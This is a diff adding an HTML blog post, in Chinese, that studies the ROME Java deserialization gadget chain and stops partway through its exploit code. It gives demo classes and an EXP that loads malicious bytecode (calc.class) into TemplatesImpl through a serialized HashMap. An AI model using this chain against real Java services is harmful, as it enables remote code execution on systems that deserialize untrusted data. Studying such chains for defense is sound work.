@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="ROME链介绍ROME是一个用于解析和生成RSS和Atom提要（feed）的开源库。它简化了处理各种格式的RSS和Atom提要的过程，并支持几乎所有常见的RSS和Atom格式版本。 环境jdk8u65 12345&lt;dependency&gt;      &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;      &lt;artifactId&gt;rome&lt;&#x2F;ar">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ROME链">
+<meta property="og:url" content="http://example.com/2024/07/13/ROME%E9%93%BE/index.html">
+<meta property="og:site_name" content="cmisl_破站">
+<meta property="og:description" content="ROME链介绍ROME是一个用于解析和生成RSS和Atom提要（feed）的开源库。它简化了处理各种格式的RSS和Atom提要的过程，并支持几乎所有常见的RSS和Atom格式版本。 环境jdk8u65 12345&lt;dependency&gt;      &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;      &lt;artifactId&gt;rome&lt;&#x2F;ar">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/image-20240713032003465.png">
+<meta property="article:published_time" content="2024-07-12T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-09-01T18:02:07.382Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/image-20240713032003465.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ROME链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/cmisl">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2024/07/14/SnakeYaml%20%E9%93%BE/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2024/07/11/C3P0%20%E9%93%BE/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/13/ROME%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/13/ROME%E9%93%BE/&text=ROME链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/13/ROME%E9%93%BE/&is_video=false&description=ROME链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=ROME链&body=Check out this article: http://example.com/2024/07/13/ROME%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/13/ROME%E9%93%BE/&title=ROME链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/13/ROME%E9%93%BE/&name=ROME链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/13/ROME%E9%93%BE/&t=ROME链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ROME%E9%93%BE"><span class="toc-number">1.</span> <span class="toc-text">ROME链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.</span> <span class="toc-text">环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE"><span class="toc-number">1.3.</span> <span class="toc-text">ROME反序列化链</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.3.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.3.2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.3.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A9%E5%B1%95"><span class="toc-number">1.4.</span> <span class="toc-text">扩展</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HashTable-%E6%9B%BF%E6%8D%A2-HashMap"><span class="toc-number">1.4.1.</span> <span class="toc-text">HashTable 替换 HashMap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadAttributeValueExpException%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.2.</span> <span class="toc-text">BadAttributeValueExpException利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JdbcRowSetImpl%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.4.3.</span> <span class="toc-text">JdbcRowSetImpl利用链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-1"><span class="toc-number">1.4.3.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.2.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        ROME链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">cmisl</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-07-12T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-07-13</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="ROME链"><a href="#ROME链" class="headerlink" title="ROME链"></a>ROME链</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>ROME是一个用于解析和生成RSS和Atom提要（feed）的开源库。它简化了处理各种格式的RSS和Atom提要的过程，并支持几乎所有常见的RSS和Atom格式版本。</p>
+<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>jdk8u65</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br></pre></td></tr></table></figure>
+
+<h2 id="ROME反序列化链"><a href="#ROME反序列化链" class="headerlink" title="ROME反序列化链"></a>ROME反序列化链</h2><h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">HashMap#readObject</span> <span class="string">-&gt;</span> <span class="string">ObjectBean#hashCode()</span> <span class="string">-&gt;</span> <span class="string">EqualsBean#beanHashCode</span> <span class="string">-&gt;</span> <span class="string">ToStringBean#toString()</span> <span class="string">-&gt;ToStringBean#toString(String)</span> <span class="string">-&gt;</span> <span class="string">TemplatesImpl.getOutputProperties()</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>Rome主要是调用<code> ToStringBean#toString</code>函数，通过里面的<code>pReadMethod.invoke</code>来执行<code>TemplatesImpl#getOutputProperties()</code>，这个函数并不陌生，在fastjson利用到过，并且后续部分在cc链学习过。所以我们希望控制的参数有<code>this._obj</code>和<code>this._beanClass</code>。这两个参数就是该类构造函数的参数。</p>
+<p><code>BeanIntrospector.getPropertyDescriptors</code>函数是获取传入的Class对象对应的类中，这个类属性的gettet和setter函数，所以传入<code>this._beanClass</code>是一个TemplatesImpl的Class对象，pds数组中就一定会有getOutputProperties这个方法，接着循环取出pds中的函数依次用反射操作调用，当<code>pReadMethod.invoke</code>反射调用到<code>getOutputProperties</code>方法时，<code>this._obj</code>是我们构造的恶意TemplatesImpl类，就可以触发TemplatesImpl链执行命令了。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="built_in">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">pName</span> <span class="operator">=</span> pds[i].getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">pReadMethod</span> <span class="operator">=</span> pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="literal">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> pReadMethod.invoke(<span class="built_in">this</span>._obj, NO_PARAMS);</span><br><span class="line">                    <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="built_in">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以去找哪里调用了toString方法。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject -&gt; ObjectBean#hashCode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">beanHashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整个链子不难，我们尝试一步步构造EXP，先从demo开始。从链尾一步步向前推。</p>
+<p>先来个简单的TemplatesImpl链demo复习一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\asus\\Desktop\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcode = &#123;evil&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,evilcode);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>接着写出从toString作为链首的demo，根据最开始的分析很显然只需要让<code>this._beanClass</code>是TemplatesImpl的Class类对象，<code>this._obj</code>是构造的TemplatesImpl恶意类。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\asus\\Desktop\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcode = &#123;evil&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,evilcode);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(templates.getClass(),templates);</span><br><span class="line"></span><br><span class="line">        toStringBean.toString();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>经过上面两个demo，我们接下来可以很轻易编写整条链的EXP了。中途需要从ObjectBean#hashCode方法到EqualsBean的beanHashCode方法，不过我们在初始化objectBean时候，objectBean内部就初始化了这个类，就不需要我们多写一步。不过，我们在构造EXP时，要先给objectBean里面_equalsBean设置一个其他类，避免在HashMap#put时提前触发恶意类指令，HashMap#put完之后将之前先给objectBean里面_equalsBean替换回来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\asus\\Desktop\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] evilcode = &#123;evil&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates,evilcode);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> templates.getClass().getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templates);</span><br><span class="line">        <span class="comment">//先给objectBean里面_equalsBean设置一个其他类，避免在HashMap#put时提前触发恶意类指令</span></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(String.class, <span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(objectBean,<span class="string">&quot;cmisl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//HashMap#put完之后将之前先给objectBean里面_equalsBean替换回来</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">equalsBean</span> <span class="operator">=</span> objectBean.getClass().getDeclaredField(<span class="string">&quot;_equalsBean&quot;</span>);</span><br><span class="line">        equalsBean.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        equalsBean.set(objectBean,<span class="keyword">new</span> <span class="title class_">EqualsBean</span>(toStringBean.getClass(), toStringBean));</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span 